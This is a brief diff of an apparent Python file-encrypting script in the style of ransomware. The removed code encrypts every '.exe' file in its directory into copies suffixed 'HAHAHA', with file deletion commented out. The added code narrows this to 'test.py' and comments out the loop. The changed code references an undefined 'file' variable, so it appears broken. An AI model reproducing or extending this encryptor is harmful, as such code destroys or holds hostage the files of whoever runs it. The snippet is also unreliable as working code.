@@ -21,14 +21,20 @@ if __name__ == "__main__":
 	for (dirpath, dirnames, filenames) in os.walk(THIS_DIR):
 		break
 
-	for file in filenames:
-		if file.endswith(".exe"):
-			with open(file, "rb") as f:
-				data = f.read()
-				f.close()
-			# os.remove(file)
+	with open("test.py", "rb") as f:
+		data = f.read()
+		destination = "test.pyHAHAHA"
+		with open(destination, "wb") as fd:
+			fd.write(encrypt(data, file))
+			fd.close()
 
-			destination = file + "HAHAHA"
-			with open(destination, "wb") as fd:
-				fd.write(encrypt(data, file))
-				fd.close()
+	# for file in filenames:
+	# 	if file.endswith(".exe"):
+	# 		with open(file, "rb") as f:
+	# 			data = f.read()
+	# 		# os.remove(file)
+
+	# 		destination = file + "HAHAHA"
+	# 		with open(destination, "wb") as fd:
+	# 			fd.write(encrypt(data, file))
+	# 			fd.close()
